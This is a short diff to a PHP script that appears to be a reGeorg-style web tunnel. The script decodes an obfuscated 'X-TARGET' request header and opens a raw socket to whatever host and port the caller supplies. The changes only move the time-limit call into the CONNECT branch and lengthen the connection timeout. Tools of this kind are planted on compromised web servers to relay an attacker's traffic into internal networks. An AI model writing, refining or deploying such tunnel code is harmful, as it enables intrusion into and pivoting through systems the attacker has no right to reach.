@@ -29,7 +29,6 @@ if( !function_exists('apache_request_headers') ) {
     }
 }
 
-set_time_limit(0);
 $headers=apache_request_headers();
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
@@ -44,10 +43,11 @@ $readbuf = "readbuf".$mark;
 switch($cmd){
     case "CONNECT":
         {
+            set_time_limit(0);
             $target_ary = explode("|", base64_decode(strtr($headers["X-TARGET"], $de, $en)));
             $target = $target_ary[0];
             $port = (int)$target_ary[1];
-            $res = fsockopen($target, $port, $errno, $errstr, 1);
+            $res = fsockopen($target, $port, $errno, $errstr, 3);
             if ($res === false)
             {
                 header('X-STATUS: FAIL');
